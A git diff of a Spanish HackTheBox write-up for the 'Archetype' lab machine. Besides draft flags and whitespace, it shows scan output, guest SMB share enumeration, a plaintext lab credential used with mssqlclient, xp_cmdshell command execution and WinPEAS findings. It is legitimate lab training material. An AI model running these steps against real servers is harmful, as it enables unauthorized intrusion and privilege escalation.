@@ -3,8 +3,8 @@ type: writeup
 title: Archetype
 description: Presenta un servidor Microsoft SQL mal configurado, recursos compartidos SMB expuestos y datos confidenciales expuestos. Se puede acceder a un recurso compartido SMB expuesto sin autenticación, donde se encuentran archivos confidenciales con credenciales en texto plano. Estas credenciales se pueden usar para autenticarse en MSSQL como el usuario de la cuenta de servicio mediante la herramienta mssqlclient de Impacket. Posteriormente, se puede ejecutar comandos habilitando xp_cmdshell, tras lo cual se puede cargar y activar una shell inversa para obtener acceso al host. Finalmente, se puede usar WinPeas para buscar vulnerabilidades, lo que revela un archivo de historial de PowerShell que contiene la contraseña necesaria para lograr una escalada de privilegios completa.
 lang: es
-draft: false
-featured: true
+draft: true
+featured: false
 image: ../../../../images/writeups/hackthebox/machines/archetype/archetype.png
 platform: hackthebox
 url: https://app.hackthebox.com/machines/Archetype
@@ -52,9 +52,9 @@ PORT      STATE SERVICE      VERSION
 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
 1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
-| ms-sql-info: 
-|   10.129.204.36:1433: 
-|     Version: 
+| ms-sql-info:
+|   10.129.204.36:1433:
+|     Version:
 |       name: Microsoft SQL Server 2017 RTM
 |       number: 14.00.1000.00
 |       Product: Microsoft SQL Server 2017
@@ -64,8 +64,8 @@ PORT      STATE SERVICE      VERSION
 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
 | Not valid before: 2026-07-29T13:48:09
 |_Not valid after:  2056-07-29T13:48:09
-| ms-sql-ntlm-info: 
-|   10.129.204.36:1433: 
+| ms-sql-ntlm-info:
+|   10.129.204.36:1433:
 |     Target_Name: ARCHETYPE
 |     NetBIOS_Domain_Name: ARCHETYPE
 |     NetBIOS_Computer_Name: ARCHETYPE
@@ -88,22 +88,22 @@ PORT      STATE SERVICE      VERSION
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
+| smb2-security-mode:
+|   3.1.1:
 |_    Message signing enabled but not required
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
 |   Computer name: Archetype
 |   NetBIOS computer name: ARCHETYPE\x00
 |   Workgroup: WORKGROUP\x00
 |_  System time: 2026-07-29T06:54:01-07:00
 |_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
-| smb2-time: 
+| smb2-time:
 |   date: 2026-07-29T13:54:03
 |_  start_date: N/A
 ```
@@ -116,12 +116,12 @@ nxc smb 10.129.204.36 -u Guest -p "" --shares
 
 ```plaintext
 SMB         10.129.204.36   445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 x64 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True) (Null Auth:True)
-SMB         10.129.204.36   445    ARCHETYPE        [+] Archetype\Guest: 
+SMB         10.129.204.36   445    ARCHETYPE        [+] Archetype\Guest:
 SMB         10.129.204.36   445    ARCHETYPE        [*] Enumerated shares
 SMB         10.129.204.36   445    ARCHETYPE        Share           Permissions     Remark
 SMB         10.129.204.36   445    ARCHETYPE        -----           -----------     ------
 SMB         10.129.204.36   445    ARCHETYPE        ADMIN$                          Remote Admin
-SMB         10.129.204.36   445    ARCHETYPE        backups         READ            
+SMB         10.129.204.36   445    ARCHETYPE        backups         READ
 SMB         10.129.204.36   445    ARCHETYPE        C$                              Default share
 SMB         10.129.204.36   445    ARCHETYPE        IPC$            READ            Remote IPC
 ```
@@ -136,7 +136,7 @@ nxc smb 10.129.204.36 -u Guest -p "" --spider backups --pattern .
 
 ```plaintext
 SMB         10.129.204.36   445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 x64 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True) (Null Auth:True)
-SMB         10.129.204.36   445    ARCHETYPE        [+] Archetype\Guest: 
+SMB         10.129.204.36   445    ARCHETYPE        [+] Archetype\Guest:
 SMB         10.129.204.36   445    ARCHETYPE        [*] Spidering .
 SMB         10.129.204.36   445    ARCHETYPE        //10.129.204.36/backups/. [dir]
 SMB         10.129.204.36   445    ARCHETYPE        //10.129.204.36/backups/.. [dir]
@@ -151,7 +151,7 @@ nxc smb 10.129.204.36 -u Guest -p "" --share backups --get-file //prod.dtsConfig
 
 ```plaintext
 SMB         10.129.204.36   445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 x64 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True) (Null Auth:True)
-SMB         10.129.204.36   445    ARCHETYPE        [+] Archetype\Guest: 
+SMB         10.129.204.36   445    ARCHETYPE        [+] Archetype\Guest:
 SMB         10.129.204.36   445    ARCHETYPE        [*] Copying "//prod.dtsConfig" to "prod.dtsConfig"
 SMB         10.129.204.36   445    ARCHETYPE        [+] File "//prod.dtsConfig" was downloaded to "prod.dtsConfig"
 ```
@@ -179,7 +179,7 @@ mssqlclient.py 'sql_svc:M3g4c0rp123@10.129.204.36' -windows-auth
 ```
 
 ```plaintext
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Encryption required, switching to TLS
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
@@ -205,10 +205,10 @@ xp_cmdshell "whoami"
 ```
 
 ```plaintext
-output              
------------------   
-archetype\sql_svc   
-NULL  
+output
+-----------------
+archetype\sql_svc
+NULL
 ```
 
 Nos ponemos en escucha en nuestra máquina atacante.
@@ -232,7 +232,7 @@ type C:\Users\sql_svc\Desktop\user.txt
 ### User flag
 
 <Callout type="success" title="User flag">
-3******************************3
+  3******************************3
 </Callout>
 
 ## Privilege Escalation
@@ -259,10 +259,10 @@ Y lo ejecutamos. Entre los resultados encontramos el historias de comandos ejecu
 ???????????? PowerShell Settings (T1059.001)
     PowerShell v2 Version: 2.0
     PowerShell v5 Version: 5.1.17763.1
-    PowerShell Core Version: 
-    Transcription Settings: 
-    Module Logging Settings: 
-    Scriptblock Logging Settings: 
+    PowerShell Core Version:
+    Transcription Settings:
+    Module Logging Settings:
+    Scriptblock Logging Settings:
     PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
     PS history size: 79B
 ```
@@ -318,5 +318,5 @@ type ..\Desktop\root.txt
 ### Root flag
 
 <Callout type="success" title="Root flag">
-b******************************8
+  b******************************8
 </Callout>
